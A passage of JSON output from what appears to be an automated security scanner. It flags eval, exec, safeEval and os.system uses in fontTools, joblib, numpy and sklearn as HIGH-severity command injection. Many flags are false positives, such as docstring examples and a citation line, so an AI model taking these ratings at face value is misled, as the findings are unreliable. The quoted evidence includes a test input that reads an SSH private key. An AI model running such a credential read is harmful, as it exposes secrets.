            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"header\":\n            self.version = safeEval(attrs[\"version\"])\n        elif name == \"strike\":\n            if not hasattr(self, \"strikes\"):\n                self.strikes = []",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 258,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "strikeIndex = safeEval(attrs[\"index\"])",
            "context": "        elif name == \"strike\":\n            if not hasattr(self, \"strikes\"):\n                self.strikes = []\n            strikeIndex = safeEval(attrs[\"index\"])\n            curStrike = Strike()\n            curStrike.fromXML(name, attrs, content, ttFont, self)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 296,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "indexFormat = safeEval(name[len(_indexSubTableSubclassPrefix) :])",
            "context": "            if name == \"bitmapSizeTable\":\n                self.bitmapSizeTable.fromXML(name, attrs, content, ttFont)\n            elif name.startswith(_indexSubTableSubclassPrefix):\n                indexFormat = safeEval(name[len(_indexSubTableSubclassPrefix) :])\n                indexFormatClass = locator.getIndexFormatClass(indexFormat)\n                indexSubTable = indexFormatClass(None, None)\n                indexSubTable.indexFormat = indexFormat",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 342,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "vars(self)[name] = safeEval(attrs[\"value\"])",
            "context": "                metricObj.fromXML(name, attrs, content, ttFont)\n                vars(self)[direction] = metricObj\n            elif name in dataNames:\n                vars(self)[name] = safeEval(attrs[\"value\"])\n            else:\n                log.warning(\"unknown name '%s' being ignored in BitmapSizeTable.\", name)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 364,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "vars(self)[name] = safeEval(attrs[\"value\"])",
            "context": "                continue\n            name, attrs, content = element\n            if name in metricNames:\n                vars(self)[name] = safeEval(attrs[\"value\"])\n\n\n# Important information about the naming scheme. Used for identifying subtables.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 432,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.imageFormat = safeEval(attrs[\"imageFormat\"])",
            "context": "        # Read all the attributes. Even though the glyph indices are\n        # recalculated, they are still read in case there needs to\n        # be an immediate export of the data.\n        self.imageFormat = safeEval(attrs[\"imageFormat\"])\n        self.firstGlyphIndex = safeEval(attrs[\"firstGlyphIndex\"])\n        self.lastGlyphIndex = safeEval(attrs[\"lastGlyphIndex\"])\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 433,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.firstGlyphIndex = safeEval(attrs[\"firstGlyphIndex\"])",
            "context": "        # recalculated, they are still read in case there needs to\n        # be an immediate export of the data.\n        self.imageFormat = safeEval(attrs[\"imageFormat\"])\n        self.firstGlyphIndex = safeEval(attrs[\"firstGlyphIndex\"])\n        self.lastGlyphIndex = safeEval(attrs[\"lastGlyphIndex\"])\n\n        self.readMetrics(name, attrs, content, ttFont)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 434,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.lastGlyphIndex = safeEval(attrs[\"lastGlyphIndex\"])",
            "context": "        # be an immediate export of the data.\n        self.imageFormat = safeEval(attrs[\"imageFormat\"])\n        self.firstGlyphIndex = safeEval(attrs[\"firstGlyphIndex\"])\n        self.lastGlyphIndex = safeEval(attrs[\"lastGlyphIndex\"])\n\n        self.readMetrics(name, attrs, content, ttFont)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 569,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.imageSize = safeEval(attrs[\"value\"])",
            "context": "                continue\n            name, attrs, content = element\n            if name == \"imageSize\":\n                self.imageSize = safeEval(attrs[\"value\"])\n            elif name == BigGlyphMetrics.__name__:\n                self.metrics = BigGlyphMetrics()\n                self.metrics.fromXML(name, attrs, content, ttFont)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory_async.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "evaled = await memory.eval(f, 1)",
            "context": "\n        assert len(accumulator) == current_accumulator + 1\n        # Also, check that Memory.eval works similarly\n        evaled = await memory.eval(f, 1)\n        assert evaled == out\n        assert len(accumulator) == current_accumulator + 1\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_utils.py",
            "line": 8,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "[\"exec('import os')\", \"print(1)\", \"import os\", \"1+1; import os\", \"1^1\"],",
            "context": "\n@pytest.mark.parametrize(\n    \"expr\",\n    [\"exec('import os')\", \"print(1)\", \"import os\", \"1+1; import os\", \"1^1\"],\n)\ndef test_eval_expr_invalid(expr):\n    with pytest.raises(ValueError, match=\"is not a valid or supported arithmetic\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 128,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert memory.eval(f, 1) == out",
            "context": "\n        assert len(accumulator) == current_accumulator + 1\n        # Also, check that Memory.eval works similarly\n        assert memory.eval(f, 1) == out\n        assert len(accumulator) == current_accumulator + 1\n\n    # Now do a smoke test with a function defined in __main__, as the name",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 164,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        ipython_cell_id = \"<ipython-input-{}-000000000000>\".format(session_no)\n\n        my_locals = {}\n        exec(\n            compile(\n                textwrap.dedent(ipython_cell_source),\n                filename=ipython_cell_id,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 334,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a1 = eval(\"lambda x: x\")",
            "context": "    # Check that collisions impossible to detect will raise appropriate\n    # warnings.\n    memory = Memory(location=tmpdir.strpath, verbose=0)\n    a1 = eval(\"lambda x: x\")\n    a1 = memory.cache(a1)\n    b1 = eval(\"lambda x: x+1\")\n    b1 = memory.cache(b1)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 336,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b1 = eval(\"lambda x: x+1\")",
            "context": "    memory = Memory(location=tmpdir.strpath, verbose=0)\n    a1 = eval(\"lambda x: x\")\n    a1 = memory.cache(a1)\n    b1 = eval(\"lambda x: x+1\")\n    b1 = memory.cache(b1)\n\n    with warns(JobLibCollisionWarning) as warninfo:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 364,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_memory_eval(tmpdir):",
            "context": "    check_identity_lazy(function, accumulator, tmpdir.strpath)\n\n\ndef test_memory_eval(tmpdir):\n    \"Smoke test memory with a function with a function defined in an eval.\"\n    memory = Memory(location=tmpdir.strpath, verbose=0)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memory.py",
            "line": 368,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "m = eval(\"lambda x: x\")",
            "context": "    \"Smoke test memory with a function with a function defined in an eval.\"\n    memory = Memory(location=tmpdir.strpath, verbose=0)\n\n    m = eval(\"lambda x: x\")\n    mm = memory.cache(m)\n\n    assert mm(1) == 1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/externals/loky/backend/popen_loky_posix.py",
            "line": 128,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pid = fork_exec(cmd_python, self._fds, env=process_obj.env)",
            "context": "\n            from .fork_exec import fork_exec\n\n            pid = fork_exec(cmd_python, self._fds, env=process_obj.env)\n            util.debug(\n                f\"launched python with pid {pid} and cmd:\\n{cmd_python}\"\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/externals/loky/backend/fork_exec.py",
            "line": 12,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def fork_exec(cmd, keep_fds, env=None):",
            "context": "import subprocess\n\n\ndef fork_exec(cmd, keep_fds, env=None):\n    import _posixsubprocess\n\n    # Encoded command args as bytes:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/externals/loky/backend/fork_exec.py",
            "line": 46,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return _posixsubprocess.fork_exec(",
            "context": "        allow_vfork = []\n\n    try:\n        return _posixsubprocess.fork_exec(\n            cmd,  # args\n            cmd[0:1],  # executable_list\n            True,  # close_fds",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/packaging/licenses/__init__.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "invalid = eval(python_expression, globals(), locals())",
            "context": "\n    python_expression = \" \".join(python_tokens)\n    try:\n        invalid = eval(python_expression, globals(), locals())\n    except Exception:\n        invalid = True\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/metrics/_ranking.py",
            "line": 1586,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "European conference on information retrieval (pp. 414-421). Springer,",
            "context": "    ----------\n    McSherry, F., & Najork, M. (2008, March). Computing information retrieval\n    performance measures efficiently in the presence of tied scores. In\n    European conference on information retrieval (pp. 414-421). Springer,\n    Berlin, Heidelberg.\n    \"\"\"\n    _, inv, counts = np.unique(-y_score, return_inverse=True, return_counts=True)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/metrics/_ranking.py",
            "line": 1692,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "European conference on information retrieval (pp. 414-421). Springer,",
            "context": "\n    McSherry, F., & Najork, M. (2008, March). Computing information retrieval\n    performance measures efficiently in the presence of tied scores. In\n    European conference on information retrieval (pp. 414-421). Springer,\n    Berlin, Heidelberg.\n\n    Examples",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/metrics/_ranking.py",
            "line": 1854,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "European conference on information retrieval (pp. 414-421). Springer,",
            "context": "\n    McSherry, F., & Najork, M. (2008, March). Computing information retrieval\n    performance measures efficiently in the presence of tied scores. In\n    European conference on information retrieval (pp. 414-421). Springer,\n    Berlin, Heidelberg.\n\n    Examples",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/externals/array_api_compat/torch/__init__.py",
            "line": 12,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(n + ' = torch.' + n)",
            "context": "        or 'cpu' in n\n        or 'backward' in n):\n        continue\n    exec(n + ' = torch.' + n)\n\n# These imports may overwrite names from the import * above.\nfrom ._aliases import * # noqa: F403",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/externals/array_api_compat/cupy/fft.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from cupy.fft import *', _n)",
            "context": "#\n# from cupy.fft import __all__ as linalg_all\n_n = {}\nexec('from cupy.fft import *', _n)\ndel _n['__builtins__']\nfft_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/externals/array_api_compat/cupy/linalg.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from cupy.linalg import *', _n)",
            "context": "#\n# from cupy.linalg import __all__ as linalg_all\n_n = {}\nexec('from cupy.linalg import *', _n)\ndel _n['__builtins__']\nlinalg_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/externals/array_api_compat/dask/array/fft.py",
            "line": 6,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from dask.array.fft import *', _n)",
            "context": "#\n# from dask.array.fft import __all__ as linalg_all\n_n = {}\nexec('from dask.array.fft import *', _n)\ndel _n['__builtins__']\nfft_all = list(_n)\ndel _n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/externals/array_api_compat/dask/array/linalg.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from dask.array.linalg import *', _n)",
            "context": "#\n# from dask.array.linalg import __all__ as linalg_all\n_n = {}\nexec('from dask.array.linalg import *', _n)\ndel _n['__builtins__']\nif 'annotations' in _n:\n    del _n['annotations']",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(0,hermeline(3, 2))",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermeline\n    >>> from numpy.polynomial.hermite_e import hermeline, hermeval\n    >>> hermeval(0,hermeline(3, 2))\n    3.0\n    >>> hermeval(1,hermeline(3, 2))\n    5.0",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 248,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(1,hermeline(3, 2))",
            "context": "    >>> from numpy.polynomial.hermite_e import hermeline, hermeval\n    >>> hermeval(0,hermeline(3, 2))\n    3.0\n    >>> hermeval(1,hermeline(3, 2))\n    5.0\n\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 304,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval((-1, 0, 1), coef)",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermefromroots, hermeval\n    >>> coef = hermefromroots((-1, 0, 1))\n    >>> hermeval((-1, 0, 1), coef)\n    array([0., 0., 0.])\n    >>> coef = hermefromroots((-1j, 1j))\n    >>> hermeval((-1j, 1j), coef)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 307,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval((-1j, 1j), coef)",
            "context": "    >>> hermeval((-1, 0, 1), coef)\n    array([0., 0., 0.])\n    >>> coef = hermefromroots((-1j, 1j))\n    >>> hermeval((-1j, 1j), coef)\n    array([0.+0.j, 0.+0.j])\n\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 791,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tmp[0] += k[i] - hermeval(lbnd, tmp)",
            "context": "            tmp[1] = c[0]\n            for j in range(1, n):\n                tmp[j + 1] = c[j]/(j + 1)\n            tmp[0] += k[i] - hermeval(lbnd, tmp)\n            c = tmp\n    c = np.moveaxis(c, 0, iaxis)\n    return c",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 797,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def hermeval(x, c, tensor=True):",
            "context": "    return c\n\n\ndef hermeval(x, c, tensor=True):\n    \"\"\"\n    Evaluate an HermiteE series at points x.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 857,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(1, coef)",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermeval\n    >>> coef = [1,2,3]\n    >>> hermeval(1, coef)\n    3.0\n    >>> hermeval([[1,2],[3,4]], coef)\n    array([[ 3., 14.],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 859,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval([[1,2],[3,4]], coef)",
            "context": "    >>> coef = [1,2,3]\n    >>> hermeval(1, coef)\n    3.0\n    >>> hermeval([[1,2],[3,4]], coef)\n    array([[ 3., 14.],\n           [31., 54.]])\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 1088,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "``hermeval(x, c)`` are the same up to roundoff. This equivalence is",
            "context": "\n    If `c` is a 1-D array of coefficients of length ``n + 1`` and `V` is the\n    array ``V = hermevander(x, n)``, then ``np.dot(V, c)`` and\n    ``hermeval(x, c)`` are the same up to roundoff. This equivalence is\n    useful both for least squares fitting and for the evaluation of a large\n    number of HermiteE series of the same degree and sample points.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 1357,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> y = hermeval(x, [1, 2, 3]) + err",
            "context": "    >>> x = np.linspace(-10, 10)\n    >>> rng = np.random.default_rng()\n    >>> err = rng.normal(scale=1./10, size=len(x))\n    >>> y = hermeval(x, [1, 2, 3]) + err\n    >>> hermefit(x, y, 2)\n    array([1.02284196, 2.00032805, 2.99978457]) # may vary\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/tests/test_public_api.py",
            "line": 420,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(module_name)",
            "context": "\n    for module_name in PUBLIC_ALIASED_MODULES:\n        try:\n            eval(module_name)\n        except AttributeError:\n            module_names.append(module_name)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/ma/timer_comparison.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(eval(\"ModuleTester.test_%i.__doc__\" % i))",
            "context": "        cur = timeit.Timer(func, setup_cur).repeat(nrepeat, nloop*10)\n        cur = np.sort(cur)\n        print(\"#%i\" % i + 50*'.')\n        print(eval(\"ModuleTester.test_%i.__doc__\" % i))\n        print(f'core_current : {cur[0]:.3f} - {cur[1]:.3f}')\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 521,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Raises\n    ------",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 546,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Returns\n    -------",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 641,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = ast.literal_eval(header)",
            "context": "    #\n    # For performance reasons, we try without _filter_header first though\n    try:\n        d = ast.literal_eval(header)\n    except SyntaxError as e:\n        if version <= (2, 0):\n            header = _filter_header(header)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 646,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = ast.literal_eval(header)",
            "context": "        if version <= (2, 0):\n            header = _filter_header(header)\n            try:\n                d = ast.literal_eval(header)\n            except SyntaxError as e2:\n                msg = \"Cannot parse header: {!r}\"\n                raise ValueError(msg.format(header)) from e2",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 781,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 900,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Returns\n    -------",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 576,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def safe_eval(source):",
            "context": "        print(inspect.getdoc(object), file=output)\n\n\ndef safe_eval(source):\n    \"\"\"\n    Protected string evaluation.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 610,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('1')",
            "context": "\n    Examples\n    --------\n    >>> np.safe_eval('1')\n    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 612,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('[1, 2, 3]')",
            "context": "    --------\n    >>> np.safe_eval('1')\n    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]\n    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 614,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')",
            "context": "    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]\n    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}\n\n    >>> np.safe_eval('import os')",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 617,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('import os')",
            "context": "    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}\n\n    >>> np.safe_eval('import os')\n    Traceback (most recent call last):\n      ...\n    SyntaxError: invalid syntax",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 622,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('open(\"/home/user/.ssh/id_dsa\").read()')",
            "context": "      ...\n    SyntaxError: invalid syntax\n\n    >>> np.safe_eval('open(\"/home/user/.ssh/id_dsa\").read()')\n    Traceback (most recent call last):\n      ...\n    ValueError: malformed node or string: <_ast.Call object at 0x...>",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 640,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return ast.literal_eval(source)",
            "context": "\n    # Local import to speed up numpy's import time.\n    import ast\n    return ast.literal_eval(source)\n\n\ndef _median_nancheck(data, result, axis):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_npyio_impl.py",
            "line": 142,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_npyio_impl.py",
            "line": 353,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/diagnose.py",
            "line": 9,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(cmd)",
            "context": "\ndef run_command(cmd):\n    print('Running %r:' % (cmd))\n    os.system(cmd)\n    print('------')\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 619,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval('%s:%s' % (l1, ' and '.join(l2)))",
            "context": "    for i in range(len(f)):\n        l1 = '%s,f%d=f[%d]' % (l1, i, i)\n        l2.append('f%d(v)' % (i))\n    return eval('%s:%s' % (l1, ' and '.join(l2)))\n\n\ndef l_or(*f):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 627,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval('%s:%s' % (l1, ' or '.join(l2)))",
            "context": "    for i in range(len(f)):\n        l1 = '%s,f%d=f[%d]' % (l1, i, i)\n        l2.append('f%d(v)' % (i))\n    return eval('%s:%s' % (l1, ' or '.join(l2)))\n\n\ndef l_not(f):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 631,
            "severity": "HIGH",
